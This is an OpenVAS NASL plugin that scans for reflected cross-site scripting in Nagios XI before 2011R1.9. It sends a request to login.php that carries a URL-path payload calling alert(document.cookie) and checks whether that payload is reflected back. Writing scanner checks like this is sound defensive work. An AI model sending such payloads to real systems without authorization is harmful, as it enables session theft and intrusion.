##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_nagiosxi_mult_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Nagios XI Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "Nagios XI versions prior to 2011R1.9";
tag_insight = "Multiple flaws are due to improper validation of user-supplied input
  appended to the URL in multiple scripts, which allows attackers to execute
  arbitrary HTML and script code in a user's browser session in the context
  of an affected site.";
tag_solution = "Upgrade to Nagios XI version 2011R1.9 or later,
  For updates refer to http://www.nagios.com/products/nagiosxi";
tag_summary = "This host is running Nagios XI and is prone to multiple cross-site
  scripting vulnerabilities.";

if(description)
{
  script_id(902599);
  script_version("$Revision: 13 $");
  script_bugtraq_id(51069);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-12-16 10:10:10 +0530 (Fri, 16 Dec 2011)");
  script_name("Nagios XI Multiple Cross Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/51069");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/71825");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/71826");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2011/Dec/354");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/107872/0A29-11-3.txt");

  script_description(desc);
  script_summary("Check if Nagios XI is vulnerable to Cross-Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("gb_nagios_XI_detect.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get Nagios XI Installed Location
if(!dir = get_dir_from_kb(port:port, app:"nagiosxi")){
  exit(0);
}

## Construct the Attack Request
url = dir + '/login.php/";alert(document.cookie);"';

## Try attack and check the response to confirm vulnerability
if(http_vuln_check(port:port, url:url, check_header: TRUE,
   pattern:";alert\(document.cookie\);")){
  security_warning(port);
}
